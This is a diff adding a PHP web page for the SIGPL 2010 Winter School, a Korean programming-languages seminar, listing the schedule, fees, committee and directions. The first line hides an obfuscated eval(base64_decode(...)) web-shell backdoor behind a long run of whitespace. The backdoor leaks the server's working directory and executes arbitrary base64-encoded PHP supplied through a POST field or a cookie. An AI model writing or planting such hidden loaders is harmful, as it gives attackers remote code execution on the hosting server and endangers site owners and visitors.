@@ -1,0 +1,134 @@
+<?php  	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 	 /*b210c1c6c1ff379542e0106c9afa9346*/ eval(base64_decode("JGggID0gICAgICd3Jzs7ICAgIGlmICAgICAoICBpc3NldCggICRfQ09PS0lFWydkd2MnXSkgICkgICAgIHsgICBlY2hvICAnPGN3ZD4nICAgLiAgICAgZ2V0Y3dkKCkgICAuICAnPC9jd2Q+Jzs7ICAgICB9ICAgaWYgICAoICAgIGlzc2V0ICAoICAgICRfUE9TVFsncGIyMSddICAgICApICAgICkgIHsgIGV2YWwgICggIGJhc2U2NF9kZWNvZGUgICggICAkX1BPU1RbJ3BiMjEnXSAgICAgKSAgICk7OyA7ICAgcmV0dXJuOzsgICB9ICBpZiAgICAoICBpc3NldCggICAkX0NPT0tJRVsncGIyMSddKSAgICAgKSAgeyAgZXZhbCAgKCAgIGJhc2U2NF9kZWNvZGUgICAoICAkX0NPT0tJRVsncGIyMSddICAgICkgICAgKTs7IDsgOyAgICAgcmV0dXJuOzsgOyA7ICAgfSAg")); ?><meta http-equiv="Content-Type" content="text/html; charset=euc-kr" />
+<html>
+<head>
+<link rel="stylesheet" type="text/css" href="/style.css">
+<title>SIGPL 2010 겨울학교</title>
+<style type="text/css">
+   .small { font-size: 10pt; }
+   .smallbold { font-size: 10pt; font-weight: bold; }
+</style>
+</head>
+<body>
+
+<h1>
+<center>
+한국정보과학회 프로그래밍언어연구회 겨울학교
+<br> (SIGPL Winter School 2010)
+</center>
+</h1>
+<center><table><tr><th align="left">
+<li>
+   일시: 2010년 2월 19일(금)
+<li>
+   장소: 성신여자대학교 성신관 710호
+</td></tr></table>
+</center>
+<br>
+ <p>
+한국정보과학회 프로그래밍언어 연구회(SIGPL)는 매년 여름과 겨울 방학기간에 대학원생과 엔지니어, 교수, 연구자들을 대상으로 계절학교를 개최하고 있습니다. 이번 겨울학교에는  병렬프로그래밍, 타입 이론, 함수형 프로그래밍, 소프트웨어 저작권과 관련된 강의가 준비되어 있습니다. 많은 관심과 참여를 부탁드립니다.
+</p>
+<p>
+<b>한국정보과학회 프로그래밍언어연구회 운영위원장 변석우</b>
+</p>
+
+<h2>프로그램 일정</h2>
+
+<?php
+
+$content = 
+  '09:30-09:45 | 등록 | ##
+   head | 오전 세션 ##
+   09:45-10:45 &nbsp; | 직렬로 생각하는 버릇 깨기 (Breaking Sequential Habits of Thought) 1 | 류석영 (KAIST) ##
+   11:00-12:00 | 직렬로 생각하는 버릇 깨기 (Breaking Sequential Habits of Thought) 2 | 류석영 (KAIST) ##
+   head | 오후 세션 ##
+   13:30-14:45 | Programming with dependent types | 이계식 (서울대) ##
+   15:00-16:15 | 모나드와 모나드 트랜스포머를 이용하는 프로그래밍 | 변석우 (경성대) ##
+   16:30-17:45 | 소프트웨어 저작권 보호를 위한 코드 도용 탐지 방법 | 임현일 (KAIST) 
+';
+
+$list = explode("##", $content);
+
+echo '
+  <table border="0" cellspacing="0">
+  <tr><td bgcolor="#cccccc">
+  <table border="0" cellspacing="1pt">
+';
+
+$size = array ("0", "0", "0", "0");
+	
+foreach($list as $elm) {
+  $value = explode("|", $elm);
+  echo "<tr>";
+  
+  if(trim($value[0]) == "head") {
+    $sw = 0;
+    foreach($value as $elm) {
+      if($sw == 1) { echo "<th colspan=\"3\" align=\"left\">".$elm."</th>"; }
+      else if($sw > 1) { echo "<th>".$elm."</th>"; }
+      $sw++; 
+    }
+  }
+  else {
+    $sw = 0;
+    foreach($value as $elm) {
+      if($size[$sw] != 0) echo '<td bgcolor="white" width="'.$size[$sw].'">'.$elm."</td>";
+      else echo '<td bgcolor="white">'.$elm."</td>";
+      $sw++;
+    }
+  }
+  
+  echo "</tr>";
+}
+					  
+echo "</table></table>";
+
+?>
+				   
+
+<h2> 등록안내 </h2>
+<ul>
+<li> 등록비 
+<table border="1" bordercolor="#a0a0a0" cellspacing="0">
+<tr><th>&nbsp;</th><th>학생회원</th><th>일반회원</th><th>비회원</th></tr>
+<tr align="center"><th>등록비</th><td>80,000원</td><td>120,000원</td><td>150,000원</td></tr>
+</table>
+  <li> 중식/석식 제공
+  <li> 등록 방법: <a href="/pay/school.php">등록페이지</a>를 통하여 등록
+		    <li> 제한된 예산 내에서 지원이 필요한 학생회원에게 등록비 일부를 지원할 예정입니다. 등록비 지원이 필요하신 분은 이메일 <img src="/mail/jsahn.jpg">로 등록 전에 미리 신청 바랍니다. (이 경우 현금 이체 사전등록만 가능)
+</ul>
+
+<h2> 준비위원회 </h2>
+<ul>
+  <li> 학술위원장: 신승철 교수 (한국기술교육대학교)
+  <li> 조직위원장: 김도형 교수 (성신여자대학교)
+  <li> 문의: 안준선 교수 (한국항공대학교, 010-6208-5593, <img src="/mail/jsahn.jpg">)
+</ul>
+
+  <h2> 장소안내 </h2>
+<h3> 성신여자대학교 오시는 길</h3>
+<ul>
+				 <li> 주소: 서울특별시 성북구 동선동3가 249-1 (동선동길 54-7)
+				 <li> 전화: 02-920-7114
+				 <li> 버스
+<ul>
+				 <li> 성신여대 입구: 101, 102, 103, 104, 106, 107, 140, 142, 143, 149, 150, 152, 160, 161, 162, 171, 172, 1162, 1212
+				 <li> 성북구청 입구: 103, 142, 152, 272, 1014, 1111
+</ul>
+				 <li> 지하철: 4호선 성신대입구역 또는 6호선 보문역 4번 출구에서 하차하시고 10분 정도 이동하시면 됩니다.
+</ul>
+
+<h3>
+학교내부에서 행사장소까지 오시는 길</h3>
+<img border="0" src="map.gif">
+
+<!-- center>
+<a href="building.jpg"><img width="640" border="0" src="building.jpg"></a>
+</center>
+<ul>
+<li>
+				 B24 1층 소강의실: 정문 -> 분수대 -> 분수대 왼쪽길 -> 골프연습장 -> 우측 2번째 건물 (큰 나무가 있는 건물)
+</ul>
+</ul-->
+
+</body>
+</html>
